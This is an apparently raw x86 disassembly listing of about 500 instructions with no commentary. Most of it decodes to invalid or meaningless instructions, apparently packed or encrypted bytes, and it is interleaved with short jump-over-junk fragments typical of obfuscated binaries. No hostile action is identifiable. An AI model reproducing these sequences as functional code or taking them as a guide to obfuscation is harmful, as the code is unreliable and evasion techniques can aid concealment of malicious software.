  414f34:	add    al,0xdf
  414f36:	fdiv   QWORD PTR [ebp-0x16]
  414f39:	jecxz  0x414ed9
  414f3b:	adc    ah,BYTE PTR [eax+0x38]
  414f3e:	push   ecx
  414f3f:	gs push esi
  414f41:	dec    edi
  414f42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414f44:	dec    eax
  414f45:	or     cl,ch
  414f47:	aam    0x23
  414f49:	mov    esi,0xf1945273
  414f4e:	in     al,0x4
  414f50:	in     al,0xbc
  414f52:	stc    
  414f53:	sbb    dl,cl
  414f55:	add    al,0xe2
  414f57:	adc    bl,BYTE PTR [ecx]
  414f59:	mov    ah,0xe2
  414f5b:	mov    al,0x32
  414f5d:	out    0x24,eax
  414f5f:	mov    ah,0x21
  414f61:	mov    edi,0x4ed3b32b
  414f66:	inc    eax
  414f67:	mov    edx,0x3cc05a68
  414f6c:	add    eax,DWORD PTR [ebp-0x58]
  414f6f:	add    eax,DWORD PTR [ebp-0x84]
  414f75:	jmp    0x415040
  414f7a:	in     ax,dx
  414f7c:	xchg   ecx,eax
  414f7d:	sti    
  414f7e:	fwait
  414f7f:	jmp    FWORD PTR [esi-0x3]
  414f82:	dec    edx
  414f83:	(bad)  
  414f84:	(bad)  
  414f85:	mov    eax,ds:0x6da7acbd
  414f8a:	cdq    
  414f8b:	jmp    0x414f8d
  414f8d:	add    BYTE PTR [esi-0x35000000],ch
  414f93:	test   al,al
  414f95:	mov    cl,BYTE PTR [ecx]
  414f97:	xchg   ebx,eax
  414f98:	sbb    al,0xf8
  414f9a:	lock xchg BYTE PTR [edx+0x1ab1854c],bl
  414fa1:	and    dl,BYTE PTR [ebx+0x7]
  414fa4:	mov    DWORD PTR cs:[esi-0x6fcaac49],ecx
  414fab:	aad    0x13
  414fad:	mov    edi,0x2eb28b22
  414fb2:	not    ah
  414fb4:	loop   0x414f82
  414fb6:	pop    es
  414fb7:	sub    ebx,esi
  414fb9:	jecxz  0x415032
  414fbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414fbc:	adc    eax,0xbe30b229
  414fc1:	ins    DWORD PTR es:[edi],dx
  414fc2:	dec    ebp
  414fc3:	movsx  edi,BYTE PTR [edi]
  414fc6:	inc    edi
  414fc7:	adc    edx,ecx
  414fc9:	loop   0x415022
  414fcb:	es sbb al,0xa0
  414fce:	lds    esi,FWORD PTR [edx+eax*8+0x33]
  414fd2:	pop    esp
  414fd3:	ret    
  414fd4:	mov    eax,edi
  414fd6:	(bad)  
  414fd7:	bound  ecx,QWORD PTR [edi]
  414fd9:	sub    DWORD PTR [edx-0x28],esp
  414fdc:	xor    BYTE PTR [ebx+0x4f],al
  414fdf:	sub    dl,BYTE PTR [edi]
  414fe1:	push   edx
  414fe2:	ds out dx,al
  414fe4:	ficom  DWORD PTR [esi]
  414fe6:	adc    edx,esi
  414fe8:	mov    ebx,DWORD PTR [ecx+0x117ff085]
  414fee:	mov    ds:0x7dff856b,eax
  414ff3:	test   BYTE PTR [edx+0x7a],ch
  414ff6:	(bad)  
  414ff7:	cmp    BYTE PTR [ebx+0x12],dh
  414ffa:	cmp    BYTE PTR [eax],0x7d
  414ffd:	lahf   
  414ffe:	sub    al,BYTE PTR [eax-0x69]
  415001:	pusha  
  415002:	in     eax,dx
  415003:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415004:	js     0x415008
  415006:	jecxz  0x414fef
  415008:	in     eax,dx
  415009:	sub    eax,0x24d805ec
  41500e:	fwait
  41500f:	fwait
  415010:	(bad)  
  415011:	xchg   ecx,eax
  415012:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415013:	mov    ebp,0x977031ad
  415018:	arpl   WORD PTR [edx+0x7a284275],bp
  41501e:	push   ebp
  41501f:	adc    al,0x9f
  415021:	lock inc esi
  415023:	loope  0x414fa8
  415025:	inc    ebx
  415026:	and    DWORD PTR [edi-0x40],eax
  415029:	cmp    BYTE PTR [esp+edx*2+0x14],0xdf
  41502e:	and    cl,dl
  415030:	pop    es
  415031:	fisub  DWORD PTR [ebx+0x41]
  415034:	(bad)  
  415035:	mov    al,0xa3
  415037:	push   esp
  415038:	or     DWORD PTR [esi+esi*4-0x675c526],esi
  41503f:	xor    cl,BYTE PTR [ebx-0x39163bb3]
  415045:	add    BYTE PTR [eax],al
  415047:	add    al,bl
  415049:	jne    0x415052
  41504b:	retf   0xfaaf
  41504e:	fnsave [edi+0x7c]
  415051:	or     BYTE PTR [ebp-0x4c042790],bl
  415057:	pop    ecx
  415058:	inc    edi
  415059:	in     al,dx
  41505a:	add    BYTE PTR [eax],al
  41505c:	scas   al,BYTE PTR es:[edi]
  41505d:	add    BYTE PTR [eax],al
  41505f:	add    BYTE PTR [eax],cl
  415061:	mov    fs,WORD PTR [eax]
  415063:	lea    eax,[edi-0x443f786e]
  415069:	sub    DWORD PTR [eax+0x3],esi
  41506c:	sbb    esp,DWORD PTR [ecx-0x33]
  41506f:	mov    DWORD PTR [ecx],ecx
  415071:	sbb    al,0xa3
  415073:	and    bh,dl
  415075:	push   0xffffffa4
  415077:	inc    esi
  415078:	or     esp,DWORD PTR [edi-0x34]
  41507b:	pop    ss
  41507c:	jmp    0x143bcb27
  415081:	add    BYTE PTR [eax+0x14],al
  415084:	test   eax,0xe0cbced
  415089:	(bad)  
  41508a:	imul   ebx,esp,0x204f0189
  415090:	mov    esi,0x2273b530
  415095:	(bad)  
  415097:	adc    al,0x4c
  415099:	and    eax,0x3abc58a7
  41509e:	mov    DWORD PTR [ebx],ebx
  4150a0:	jbe    0x415117
  4150a2:	(bad)
  4150a5:	iret   
  4150a6:	sub    DWORD PTR [edx+eiz*2-0x6856b81c],eax
  4150ad:	xorps  xmm5,XMMWORD PTR [ecx+ebx*2+0x1605bca5]
  4150b5:	lods   al,BYTE PTR ds:[esi]
  4150b6:	add    ecx,DWORD PTR [edx+ebx*8+0x1fcce082]
  4150bd:	stc    
  4150be:	adc    BYTE PTR [ebx+edi*8],bl
  4150c1:	or     eax,0xf185f89a
  4150c6:	xchg   esp,eax
  4150c7:	stc    
  4150c8:	jnp    0x415083
  4150ca:	cmp    al,0x9b
  4150cc:	pop    edi
  4150cd:	pushf  
  4150ce:	inc    edi
  4150cf:	add    BYTE PTR [esi+edi*2-0x57],0xd6
  4150d4:	stos   DWORD PTR es:[edi],eax
  4150d5:	(bad)  
  4150d6:	into   
  4150d7:	dec    edx
  4150d8:	call   0xb94b:0x1aaf4e8d
  4150df:	cmp    DWORD PTR [ebx],eax
  4150e1:	out    dx,al
  4150e2:	jg     0x415138
  4150e4:	inc    esp
  4150e5:	sbb    BYTE PTR cs:[edi-0x29],0xd5
  4150ea:	push   ds
  4150eb:	jmp    0x82e8:0xf616093f
  4150f2:	sar    DWORD PTR [edx],1
  4150f4:	jns    0x415142
  4150f6:	cs sub eax,0x751ba6d
  4150fc:	jp     0x41516b
  4150fe:	xchg   ecx,eax
  4150ff:	xor    eax,0x4473cce0
  415104:	bound  ebx,QWORD PTR [edx+0x280fd2e0]
  41510a:	xor    ecx,eax
  41510c:	dec    ebx
  41510d:	cmp    DWORD PTR ds:0x22d6,esp
  415113:	imul   eax,ecx
  415116:	xor    eax,0x394c0
  41511b:	add    eax,DWORD PTR [ebp-0x64]
  41511e:	push   eax
  41511f:	jmp    0x4151ea
  415124:	mov    bl,0xa9
  415126:	cmp    al,0x7
  415128:	ds xchg edi,eax
  41512a:	mov    ebx,0xeca595bd
  41512f:	or     eax,0x7a04e265
  415134:	cmc    
  415135:	in     al,dx
  415136:	add    BYTE PTR [eax],al
  415138:	scas   al,BYTE PTR es:[edi]
  415139:	add    BYTE PTR [eax],al
  41513b:	add    BYTE PTR ds:0x16aaa539,ch
  415141:	(bad)  
  415142:	sub    ah,ch
  415144:	mov    ebx,0x5b7049fc
  415149:	mov    edx,0xf0ed3629
  41514e:	rcr    BYTE PTR [esi+0x7377db2a],cl
  415154:	shl    DWORD PTR [esi],cl
  415156:	jmp    FWORD PTR ds:0x8184538
  41515c:	dec    ecx
  41515d:	das    
  41515e:	je     0x415149
  415160:	push   0xaaaaf2e2
  415165:	dec    eax
  415166:	nop
  415167:	jmp    0x174c:0xa15cd0a4
  41516e:	mov    al,0xb5
  415170:	cli    
  415171:	enter  0x86ca,0x86
  415175:	adc    BYTE PTR [edx+0x493dc206],dh
  41517b:	cli    
  41517c:	data16 mov ds:0x30b42492,al
  415182:	adc    DWORD PTR [edx-0x64ad30fc],ebx
  415188:	push   0x6e
  41518a:	out    0xe4,al
  41518c:	fadd   DWORD PTR fs:[edi]
  41518f:	loopne 0x415151
  415191:	fnstsw WORD PTR [edx-0x6f]
  415194:	jp     0x415143
  415196:	adc    edi,DWORD PTR [ebx+0x731136cd]
  41519c:	dec    eax
  41519d:	stc    
  41519e:	push   edx
  41519f:	shl    BYTE PTR [esi],0x2d
  4151a2:	mov    ds:0x9fbea855,eax
  4151a7:	aam    0xb2
  4151a9:	stos   DWORD PTR es:[edi],eax
  4151aa:	loope  0x4151d4
  4151ac:	pop    ebx
  4151ad:	push   cs
  4151ae:	adc    cl,BYTE PTR ds:0xbe8b8e54
  4151b4:	mov    bl,ch
  4151b6:	or     BYTE PTR [eax-0x3c7c6644],dh
  4151bc:	jb     0x4151d6
  4151be:	push   es
  4151bf:	pop    ecx
  4151c0:	mov    dh,0xf7
  4151c2:	(bad)  
  4151c3:	fucomi st,st(1)
  4151c5:	push   edi
  4151c6:	or     DWORD PTR [esi-0x40de8626],ecx
  4151cc:	int    0x3a
  4151ce:	jge    0x4151df
  4151d0:	xchg   esp,eax
  4151d1:	(bad)  
  4151d2:	jl     0x41515f
  4151d4:	dec    esi
  4151d5:	sbb    al,0xb0
  4151d7:	fidiv  DWORD PTR [edx+0x6c]
  4151da:	jg     0x41521e
  4151dc:	xchg   edi,eax
  4151dd:	iret   
  4151de:	mov    bl,0x9a
  4151e0:	jmp    0x41524d
  4151e2:	sbb    al,BYTE PTR [edx-0x50]
  4151e5:	or     eax,0x1fbb5714
  4151ea:	mov    eax,DWORD PTR [ebp-0x78]
  4151ed:	jmp    0x4152b8
  4151f2:	mov    bp,0xf846
  4151f6:	(bad)  
  4151f8:	(bad)  
  4151f9:	mov    edi,0xa18c4dba
  4151fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151ff:	(bad)  
  415200:	jae    0x415272
  415202:	mov    ds:0xae0000ed,eax
  415207:	add    BYTE PTR [eax],al
  415209:	add    dl,bh
  41520b:	lods   eax,DWORD PTR ds:[esi]
  41520c:	add    ch,cl
  41520e:	jb     0x415190
  415210:	nop
  415211:	pop    ss
  415212:	shr    DWORD PTR [esi],0x96
  415215:	icebp  
  415216:	jns    0x41526d
  415218:	mov    esp,0xddddf987
  41521d:	sub    eax,0xee2cc60d
  415222:	mov    al,ds:0x38ccba86
  415227:	mov    bh,0xc5
  415229:	test   al,0xb7
  41522b:	push   edi
  41522c:	shr    bh,1
  41522e:	add    al,0xc
  415230:	cmp    eax,0xbf61d5f3
  415235:	leave  
  415236:	xlat   BYTE PTR ds:[ebx]
  415237:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415238:	mov    ecx,0x68081aad
  41523d:	gs dec esi
  41523f:	add    BYTE PTR [ecx],0x3
  415242:	push   ds
  415243:	push   edx
  415244:	inc    edx
  415245:	add    al,0xfe
  415247:	daa    
  415248:	ins    BYTE PTR es:[edi],dx
  415249:	shr    BYTE PTR [esi+0x76],1
  41524c:	gs jle 0x415211
  41524f:	sbb    eax,0x73675062
  415254:	or     DWORD PTR [edx],esi
  415256:	imul   edi,DWORD PTR [edi-0x78],0x16
  41525a:	dec    eax
  41525b:	sub    ebp,DWORD PTR [ebx]
  41525d:	(bad)  
  41525e:	push   edx
  41525f:	gs aad 0x84
  415262:	test   al,0xe4
  415264:	js     0x415230
  415266:	inc    esi
  415267:	fsub   QWORD PTR [ecx]
  415269:	mov    ecx,0x5a19709b
  41526e:	pop    ds
  41526f:	xchg   ebp,eax
  415270:	les    esp,FWORD PTR [eax]
  415272:	daa    
  415273:	xchg   esp,eax
  415274:	push   ds
  415275:	push   esp
  415276:	xor    dh,BYTE PTR [esi-0x26]
  415279:	jo     0x41525b
  41527b:	push   eax
  41527c:	cmp    BYTE PTR [edx+0x19],dl
  41527f:	jno    0x41527d
  415281:	mov    edi,0xdd857938
  415286:	jmp    0x4152ea
  415288:	cdq    
  415289:	add    edx,ecx
  41528b:	cmp    dl,0x3
  41528e:	pop    esi
  41528f:	mov    esi,0x7cafbeeb
  415294:	inc    ebp
  415295:	ret    
  415296:	nop
  415297:	lods   eax,DWORD PTR ds:[esi]
  415298:	fdiv   st(7),st
  41529a:	mov    DWORD PTR [esp+ebp*1-0x20956ca0],ecx
  4152a1:	test   BYTE PTR [eax+eiz*4],dh
  4152a4:	(bad)  
  4152a5:	int    0x2
  4152a7:	jecxz  0x4152df
  4152a9:	loopne 0x415234
  4152ab:	aaa    
  4152ac:	mov    dh,0x14
  4152ae:	mov    ah,0x1a
  4152b0:	(bad)  ds:0x8ab7a03e
  4152b6:	push   edi
  4152b7:	and    ecx,DWORD PTR [ebx-0x391673b3]
  4152bd:	add    BYTE PTR [eax],al
  4152bf:	add    BYTE PTR [edx],cl
  4152c1:	or     eax,0xad8f2d88
  4152c6:	scas   eax,DWORD PTR es:[edi]
  4152c7:	das    
  4152c8:	pop    ss
  4152c9:	jns    0x415323
  4152cb:	ficom  WORD PTR [ecx-0x4b]
  4152ce:	lahf   
  4152cf:	mov    eax,ds:0xee51
  4152d4:	scas   al,BYTE PTR es:[edi]
  4152d5:	add    BYTE PTR [eax],al
  4152d7:	add    BYTE PTR [ebp-0x2f],dh
  4152da:	pusha  
  4152db:	jl     0x41529c
  4152dd:	push   0x75
  4152df:	imul   eax,DWORD PTR [ebx+0x7d3675fb],0xffffffba
  4152e6:	js     0x4152e3
  4152e8:	xchg   ebx,eax
  4152e9:	inc    esi
  4152ea:	push   eax
  4152eb:	and    al,0x63
  4152ed:	sti    
  4152ee:	adc    eax,0x1b79c435
  4152f3:	xchg   DWORD PTR [edi-0x734a6102],ebx
  4152f9:	or     DWORD PTR [esi+ecx*1-0x29],ecx
  4152fd:	(bad)  
  4152fe:	cwde   
  4152ff:	pushf  
  415300:	pop    eax
  415301:	test   eax,0x620f68ae
  415306:	in     al,dx
  415307:	sahf   
  415308:	mov    ch,0xd5
  41530a:	jg     0x415385
  41530c:	lds    ebx,FWORD PTR [edx+0x7a]
  41530f:	cli    
  415310:	aaa    
  415311:	jp     0x4152eb
  415313:	(bad)
  415316:	pop    esi
  415317:	cmp    eax,0x5fad5528
  41531c:	mov    esp,0x22644b57
  415321:	in     al,0x21
  415323:	or     cl,BYTE PTR [ecx-0x3c]
  415326:	add    DWORD PTR [edi+eiz*1+0x7e],esp
  41532a:	mov    edi,0x408826c4
  41532f:	xchg   edi,eax
  415330:	cld    
  415331:	add    ch,BYTE PTR [edi+0x71]
  415334:	repz in eax,dx
  415336:	addr16 jp 0x4152e4
  415339:	(bad)  
  41533a:	jmp    0x29b1:0x4f0b835c
  415341:	mov    dl,0xe6
  415343:	pop    edi
  415344:	into   
  415345:	aam    0x1b
  415347:	mov    cl,0xf1
  415349:	int    0x46
  41534b:	in     eax,dx
  41534c:	call   0x7117:0x299551a6
  415353:	sbb    ebp,DWORD PTR [ebx]
  415355:	inc    eax
  415357:	daa    
  415358:	dec    edx
  415359:	add    dh,BYTE PTR [ebx-0x5d]
  41535c:	sub    BYTE PTR [ebx-0x8d47a2e],ah
  415362:	mov    WORD PTR [esi-0x78a86e02],ss
  415368:	rol    BYTE PTR [eax],1
  41536a:	mov    esp,DWORD PTR [edi-0x55cd7289]
  415370:	iret   
  415371:	dec    esi
  415372:	ficomp WORD PTR [esi+esi*1+0x2b]
  415376:	xchg   esp,eax
  415377:	out    dx,eax
  415378:	cld    
  415379:	leave  
  41537a:	lods   al,BYTE PTR ds:[esi]
  41537b:	jge    0x41535f
  41537d:	sbb    BYTE PTR [edi+eax*4],ch
  415380:	or     eax,0xa023fedd
  415385:	xchg   edx,eax
  415386:	mov    ecx,DWORD PTR [ebp-0x20]
  415389:	mov    edx,DWORD PTR [ebp-0x1c]
  41538c:	mov    esi,DWORD PTR [ebp-0x44]
  41538f:	or     eax,0x2ac2
  415394:	imul   eax,eax,0xffffd000
  41539a:	jmp    0x415465
  41539f:	jg     0x41536e
  4153a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a2:	popa   
  4153a3:	mov    dh,0x6b
  4153a5:	(bad)  
  4153a6:	(bad)  
  4153a8:	xor    edx,DWORD PTR [eiz*2-0x5ee82612]
  4153af:	(bad)  
  4153b0:	out    dx,al
  4153b1:	add    BYTE PTR [eax],al
  4153b3:	scas   al,BYTE PTR es:[edi]
  4153b4:	add    BYTE PTR [eax],al
  4153b6:	add    BYTE PTR [ecx+0x8],dl
  4153b9:	push   es
  4153ba:	lds    ecx,FWORD PTR [ebx+0x24176381]
  4153c0:	fcmove st,st(4)
  4153c2:	stos   BYTE PTR es:[edi],al
  4153c3:	xor    eax,0x1789ab10
  4153c8:	outs   dx,DWORD PTR ds:[esi]
  4153c9:	pop    ebx
  4153ca:	mov    ebx,0xc883a150
  4153cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153d0:	pop    ecx
  4153d1:	or     ch,BYTE PTR [edi]
  4153d3:	or     al,0x2c
  4153d5:	int3   
  4153d6:	aad    0x5c
  4153d8:	mov    bl,al
  4153da:	cld    
  4153db:	les    ecx,FWORD PTR [ecx]
  4153dd:	mov    ecx,0x857175b
  4153e2:	xlat   BYTE PTR ds:[ebx]
  4153e3:	xor    BYTE PTR [ecx],ch
  4153e5:	outs   dx,BYTE PTR ds:[esi]
  4153e6:	mov    esi,0x1b0a7f51
  4153eb:	lods   al,BYTE PTR ds:[esi]
  4153ec:	ror    al,cl
  4153ee:	cmc    
  4153ef:	adc    DWORD PTR ds:0xe670bc0c,ebx
  4153f5:	and    esp,DWORD PTR [edi]
  4153f7:	push   0x74
  4153f9:	mov    eax,ds:0x58aaa6a2
  4153fe:	test   BYTE PTR [ebx+ebx*2],bh
  415401:	outs   dx,BYTE PTR ds:[esi]
  415402:	leave  
  415403:	cs aam 0x14
  415406:	je     0x4153eb
  415408:	test   al,0xf1
  41540a:	cmp    al,0x2b
  41540c:	imul   edx,DWORD PTR [ebx],0xfffffff5
  41540f:	jp     0x415402
  415411:	sub    eax,0x13b77412
  415416:	lods   eax,DWORD PTR ds:[esi]
  415417:	push   edi
  415418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415419:	mov    eax,ds:0xf39f201f
  41541e:	cmp    ch,BYTE PTR [edx]
  415420:	pop    esp
  415421:	es ret 
  415423:	div    BYTE PTR ds:0xb53fddf0
  415429:	retf   0xa480
  41542c:	or     eax,0x857905d7
  415431:	adc    al,BYTE PTR [ebx+0x715b69bb]
  415437:	pop    ecx
  415438:	cwde   
  415439:	imul   ebx,DWORD PTR [edi+0x268d9d60],0x10
  415440:	jnp    0x4153d6
  415442:	hlt    
  415443:	int    0x45
  415445:	jg     0x415490
  415447:	stos   DWORD PTR es:[edi],eax
  415448:	enter  0xa0f0,0xeb
  41544c:	push   0xd1577861
  415451:	xchg   esi,eax
  415452:	push   es
  415453:	push   ss
  415454:	add    dh,BYTE PTR [eax-0x719e0e4d]
  41545a:	mov    ah,0x5b
  41545c:	xor    BYTE PTR [ebx],bh
  41545e:	push   0x2de63838
  415463:	xchg   esp,eax
  415464:	dec    eax
  415465:	xor    esi,0xe10
  41546b:	jmp    0x415536
  415470:	push   esp
  415471:	les    esp,FWORD PTR [edx-0x20904dd7]
  415477:	std    
  415478:	mov    ebp,DWORD PTR [edi+0x307de66]
  41547e:	sbb    al,0xde
  415480:	lods   eax,DWORD PTR ds:[esi]
  415481:	out    dx,eax
  415482:	add    BYTE PTR [eax],al
  415484:	scas   al,BYTE PTR es:[edi]
  415485:	add    BYTE PTR [eax],al
  415487:	add    BYTE PTR [ecx-0x1f488a57],dh
  41548d:	inc    ecx
  41548e:	mov    dh,0x6c
  415490:	jmp    0x2761:0x8d07356d
  415497:	stos   DWORD PTR es:[edi],eax
  415498:	inc    esi
  415499:	dec    edi
  41549a:	inc    edi
  41549b:	xor    eax,0xcdcd18a3
  4154a0:	pop    ss
  4154a1:	pop    ds
  4154a2:	dec    eax
  4154a3:	jns    0x415435
  4154a5:	pop    ds
  4154a6:	cmp    al,0x56
  4154a8:	pop    eax
  4154a9:	pop    ds
  4154aa:	popa   
  4154ab:	sbb    BYTE PTR ss:[edx],dl
  4154ae:	xor    DWORD PTR [ebp-0x30],ecx
  4154b1:	cmp    edi,esp
  4154b3:	mov    bl,0xbd
  4154b5:	push   edx
  4154b6:	aaa    
  4154b7:	ret    0x2e58
  4154ba:	out    dx,eax
  4154bb:	int3   
  4154bc:	sbb    dl,bl
  4154be:	adc    bl,BYTE PTR [ecx-0x64]
  4154c1:	(bad)  
  4154c2:	out    0xe0,eax
  4154c4:	in     eax,dx
  4154c5:	push   0x12a9d084
  4154ca:	mov    ?,WORD PTR [ecx]
  4154cc:	sbb    al,0x6e
  4154ce:	dec    ebx
  4154cf:	xor    esi,ebp
  4154d1:	cld    
  4154d2:	cli    
  4154d3:	mov    ah,0xc7
  4154d5:	iret   
  4154d6:	mov    esi,0xef805fa1
  4154db:	and    BYTE PTR [ebp-0x6f185434],0xac
  4154e2:	or     ecx,edx
  4154e4:	adc    DWORD PTR [esi-0x12],0x7a
  4154e8:	sub    DWORD PTR [ebx],esi
  4154ea:	sbb    DWORD PTR [ebx+0x5d],ebp
  4154ed:	xchg   ebx,eax
  4154ee:	dec    esi
  4154ef:	pop    es
  4154f0:	xlat   BYTE PTR ds:[ebx]
  4154f1:	mov    dl,0xd8
  4154f3:	inc    ebp
  4154f4:	loop   0x41548a
  4154f6:	popa   
  4154f7:	push   ss
  4154f8:	push   es
  4154f9:	ret    
  4154fa:	adc    eax,0xe43b0e2b
  4154ff:	push   edx
  415500:	mov    dl,0xf8
  415502:	pop    ebp
  415503:	das    
  415504:	pop    ecx
  415505:	fisub  DWORD PTR [ecx-0x76a2d965]
  41550b:	inc    edi
  41550c:	inc    ebp
  41550d:	cmp    esi,DWORD PTR ds:[ecx]
  415510:	mov    ebp,DWORD PTR [ebx+0x1d2305c2]
  415516:	xchg   ebp,eax
  415517:	out    0x47,eax
  415519:	jnp    0x415552
  41551b:	pop    edi
  41551c:	ja     0x4154af
  41551e:	retf   
  41551f:	sbb    BYTE PTR [edi+eax*8],ch
  415522:	(bad)  
  415523:	ins    BYTE PTR es:[edi],dx
  415524:	fsubr  DWORD PTR [eax-0x76]
  415527:	loop   0x415596
  415529:	lds    ebx,FWORD PTR [eax-0x194500a4]
  41552f:	repnz aad 0x5d
  415532:	repnz and BYTE PTR [ecx+0x4b],bh
  415536:	sub    esi,0x9d5
  41553c:	and    eax,0x7227
  415541:	lea    eax,[eax+ecx*1-0x1ffc]
  415548:	xor    esi,0x6dd
  41554e:	push   eax
  41554f:	mov    eax,DWORD PTR [ebp-0x80]
  415552:	sub    esi,0x4edd
  415558:	jmp    0x415623
  41555d:	ret    0xc8ef
  415560:	in     ax,dx
  415562:	addr16 out dx,al
  415564:	out    dx,eax
  415565:	jmp    0x4fb7:0x1667a50a
  41556c:	adc    DWORD PTR [ebx-0x10],ebx
  41556f:	add    BYTE PTR [eax],al
  415571:	scas   al,BYTE PTR es:[edi]
  415572:	add    BYTE PTR [eax],al
  415574:	add    BYTE PTR [esi+0x11],al
  415577:	mov    ecx,0x2a81d126
  41557c:	fisttp WORD PTR [edx]
  41557e:	dec    esp
  41557f:	xor    ah,bh
  415581:	div    DWORD PTR [ebx-0x77]
  415584:	int3   
  415585:	and    ebp,0x4a09f74c
  41558b:	cmp    ah,BYTE PTR cs:[ebx]
  41558e:	scas   eax,DWORD PTR es:[edi]
  41558f:	xchg   BYTE PTR [ecx],bh
  415591:	pop    ds
  415592:	call   0xb21b0267
  415597:	mov    cl,0x64
  415599:	mov    ch,0x6c
  41559b:	jg     0x415585
  41559d:	pop    ebx
  41559e:	aaa    
  41559f:	push   esi
  4155a0:	jne    0x4155c1
  4155a2:	xor    bh,BYTE PTR [edx-0x2db8e3a5]
  4155a8:	cmp    al,0x52
  4155aa:	mov    ecx,esi
  4155ac:	pop    es
  4155ad:	sub    al,0xbb
  4155af:	xchg   ecx,eax
  4155b0:	pop    edi
  4155b1:	add    BYTE PTR [edx+eax*8],al
  4155b4:	adc    BYTE PTR [ebp+esi*1+0x28032d2f],cl
  4155bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155bc:	shr    BYTE PTR [ecx],0x30
  4155bf:	pusha  
  4155c0:	(bad)  
  4155c1:	adc    eax,0xee276459
  4155c6:	push   0xffffffaf
  4155c8:	and    al,0x12
  4155ca:	popf   
  4155cb:	sbb    BYTE PTR [esi],cl
  4155cd:	push   ebx
  4155ce:	jnp    0x415581
  4155d0:	rol    dh,0x2a
  4155d3:	repz out dx,eax
  4155d5:	(bad)  
  4155d6:	mov    bl,0x2b
  4155d8:	mov    ah,0xa3
  4155da:	xlat   BYTE PTR ds:[ebx]
  4155db:	call   0xa0e8e1d1
  4155e0:	or     ecx,edx
  4155e2:	lock stc 
  4155e4:	push   eax
  4155e5:	cdq    
  4155e6:	inc    ebx
  4155e7:	xlat   BYTE PTR ds:[ebx]
  4155e8:	pop    esp
  4155e9:	push   ebx
  4155ea:	retf   0x7ce6
  4155ed:	scas   eax,DWORD PTR es:[edi]
  4155ee:	mov    ds:0xe88b3375,eax
  4155f3:	sahf   
  4155f4:	sbb    eax,0x17d17ac6
  4155f9:	pop    ecx
  4155fa:	fwait
  4155fb:	push   cs
  4155fc:	sbb    DWORD PTR [edx],ebp
  4155fe:	xchg   ecx,eax
  4155ff:	xor    cl,BYTE PTR [ecx]
  415601:	(bad)  
  415602:	pop    ss
  415603:	pop    esp
  415604:	push   esi
  415605:	mov    bh,0x42
  415607:	popa   
  415608:	push   ebp
  415609:	in     al,dx
  41560a:	sub    DWORD PTR [eax],0xffffff94
  41560d:	xchg   esp,eax
  41560e:	ins    BYTE PTR es:[edi],dx
  41560f:	retf   0x4c3d
  415612:	out    0xfc,al
  415614:	dec    ebx
  415615:	sub    al,0x70
  415617:	(bad)  
  415618:	in     eax,0x77
  41561a:	mov    al,0x63
  41561c:	ins    BYTE PTR es:[edi],dx
  41561d:	xchg   DWORD PTR [eax-0x31],ecx
  415620:	pop    ds
  415621:	jle    0x415680
  415623:	imul   esi,eax
  415626:	xor    esi,0xe9e115d4
  41562c:	lea    esi,[ebp+esi*1-0xd0]
  415633:	jmp    0x4156fe
  415638:	or     al,0x46
  41563a:	inc    ebp
  41563b:	push   0x4f
  41563d:	imul   ebp,DWORD PTR [edi],0x66
  415640:	xchg   esi,eax
  415641:	retf   
  415642:	in     al,dx
  415643:	dec    esi
  415644:	xor    BYTE PTR [edx],bl
  415646:	push   esp
  415647:	or     eax,0xf109
  41564c:	scas   al,BYTE PTR es:[edi]
  41564d:	add    BYTE PTR [eax],al
  41564f:	add    BYTE PTR [esp+edx*1],bh
  415652:	in     al,dx
  415653:	ret    0x7206
  415656:	jns    0x415682
  415658:	pop    ds
  415659:	cmp    DWORD PTR [ecx+eax*1+0x25f87522],0x92ebf6e2
  415664:	add    ah,0x2
  415667:	loope  0x41567c
  415669:	stc    
  41566a:	and    DWORD PTR [ebx-0x79],edi
  41566d:	aad    0x61
  41566f:	dec    esi
  415670:	push   edx
  415671:	stc    
  415672:	pop    ebp
  415673:	fidivr WORD PTR [ecx+0x5]
  415676:	push   ecx
  415677:	stc    
  415678:	push   edx
  415679:	(bad)  
  41567a:	cmp    ecx,ebx
  41567c:	mov    ss,edx
  41567e:	mov    al,0xf0
  415680:	sbb    BYTE PTR [eax-0x330990e2],dl
  415686:	call   0x7f390073
  41568b:	ss adc bl,dh
  41568e:	sbb    ebx,DWORD PTR [ecx-0x2e]
  415691:	or     dh,BYTE PTR [ebx]
  415693:	pop    ss
  415694:	out    0x2f,al
  415696:	push   0x6d8fd333
  41569b:	inc    ebx
  41569c:	pop    eax
  41569d:	sbb    eax,0x5f472df
  4156a2:	jle    0x41567d
  4156a4:	and    al,0x35
  4156a6:	xchg   edx,eax
  4156a7:	sbb    cl,0xe6
  4156aa:	dec    eax
  4156ab:	fs loope 0x4156d9
  4156ae:	mov    edx,0x5e0a8952
  4156b3:	jnp    0x41563d
  4156b5:	ja     0x41564f
  4156b7:	inc    eax
  4156b8:	add    esp,esi
  4156ba:	jg     0x4156ec
  4156bc:	rol    BYTE PTR [ebp+ebp*1-0x1ad537bc],1
  4156c3:	imul   edi,esi,0x26c050cf
  4156c9:	sbb    BYTE PTR [eax-0x4f8cf00f],ch
  4156cf:	jne    0x41565e
  4156d1:	jns    0x4156da
  4156d3:	rcl    ah,1
  4156d5:	add    edx,ebp
  4156d7:	xchg   ebp,eax
  4156d8:	mov    WORD PTR [eax+edi*4-0x35],?
  4156dc:	sbb    ah,dh
  4156de:	add    bh,BYTE PTR [ecx]
  4156e0:	les    esp,FWORD PTR [eax]
  4156e2:	sbb    ebp,esi
  4156e4:	int    0xfb
  4156e6:	popf   
  4156e7:	jns    0x415702
  4156e9:	fld    QWORD PTR [ecx]
  4156eb:	sub    esp,DWORD PTR [ebp+0x6a0be58e]
  4156f1:	iret   
  4156f2:	out    dx,al
  4156f3:	push   0x74552a37
  4156f8:	adc    al,0x2a
  4156fa:	lock mov ch,0x47
  4156fd:	pusha  
  4156fe:	call   0x41685d
  415703:	mov    ecx,DWORD PTR [ebp-0x4c]
